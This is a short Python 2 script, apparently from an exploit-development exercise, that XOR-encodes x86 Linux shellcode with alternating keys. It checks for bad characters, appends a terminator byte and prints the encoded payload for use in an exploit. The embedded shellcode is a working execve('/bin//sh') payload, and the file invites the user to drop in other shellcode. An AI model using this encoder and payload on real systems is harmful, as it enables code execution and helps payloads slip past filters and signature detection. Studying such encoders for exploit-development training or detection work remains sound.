#!/usr/bin/python

import sys

def encodeByte(i , cnt):

	j = 0	
	bad_char = [0, 10, 13, 14]
	
	if cnt % 2 == 1:		
		j =  i^(0xAA + 0x6)
	else:
		j =  i^(0xBB + 0x6)

	if j in bad_char:
		print 'bad character generated...' + '\n'
		exit(1)
	return j

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")	#Put your shellcode

encoded = ""
encoded2 = ""
rev_encoded = []
terminator = 34

cnt = 1

for i in bytearray(shellcode):
	j = encodeByte(i , cnt)
	

	encoded += "\\x"
	encoded += "%02x" %j

	encoded2 += "0x"
	encoded2 += "%02x," %j
	
	cnt = cnt + 1


encoded += "\\x"
encoded += "%02x" %terminator

encoded2 += "0x"
encoded2 += "%02x," %terminator


print encoded + '\n'
print encoded2 + '\n'

print 'Shellcode length:%d' %len(shellcode)
